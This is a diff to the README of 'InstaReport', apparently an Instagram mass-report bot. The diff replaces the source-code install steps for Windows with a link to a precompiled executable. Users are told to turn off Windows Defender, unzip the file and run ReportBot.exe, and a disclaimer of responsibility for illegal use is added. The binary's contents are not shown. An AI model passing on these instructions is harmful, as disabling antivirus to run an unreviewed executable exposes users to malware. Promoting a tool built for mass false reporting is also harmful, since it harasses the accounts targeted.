@@ -48,14 +48,13 @@ No need to install git in linux or termux
 * `bash setup.sh` OR `python ReportBot.py`
 
 ### INSTALLATION [Windows]
-[Download python](https://www.python.org/downloads/) and [git](https://git-scm.com/downloads)
+[Direct Download Compiled Version](https://github.com/CyberRats/InstaReport/releases/tag/v1)
 
-* `git clone https://github.com/CyberRats/InstaReport`
-* `cd instareport`
-* `pip install -r requirements.txt`
-* `python ReportBot.py`
+* `Turn Off Windows Defender`
+* `Unzip The File`
+* `Star ReportBot.exe`
 * 
-[ - ] If You Don't want to install git then download this tool zip manually
+[ - ] We're Not Responible for any kind of illegal activity !
 
 ### INSTALLATION [Kali Linux]
 
